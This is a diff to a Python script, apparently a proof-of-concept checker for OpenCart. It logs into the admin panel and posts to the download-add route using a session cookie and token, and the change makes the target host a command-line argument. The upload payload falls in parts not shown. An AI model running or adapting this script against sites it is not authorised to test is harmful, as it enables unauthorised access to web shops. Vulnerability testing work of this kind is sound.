@@ -1,9 +1,10 @@
 import requests
 import urllib3
+import sys
 requests.packages.urllib3.disable_warnings()
-host = "opencart"
 
-def loginad():
+
+def loginad(host):
     session = requests.session()
     burp0_url = "https://"+host+":443/admin/index.php?route=common/login"
     burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept-Encoding": "gzip, deflate", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Connection": "close", "Cache-Control": "max-age=0", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "Content-Type": "multipart/form-data; boundary=---------------------------7e41da1a409b4", "Upgrade-Insecure-Requests": "1"}
@@ -36,7 +37,7 @@ def loginad():
 #      }
 
 
-def addfile(adcookies,adtoken):
+def addfile(host,adcookies,adtoken):
     session = requests.session()
     burp0_url = "https://"+host+":443/admin/index.php?route=catalog/download/add&user_token="+adtoken
     burp0_cookies = {"OCSESSID": adcookies}
@@ -62,11 +63,12 @@ def check_poc(r_check):
 
 
 if __name__ == "__main__":
-    n=loginad()
+    host = sys.argv[1]
+    n=loginad(host)
     adcookies=n[0]
     adtoken=n[1] 
     session=n[2]
-    r_check=addfile(adcookies,adtoken)
+    r_check=addfile(host,adcookies,adtoken)
   
     result=check_poc(r_check)
     exit(result)
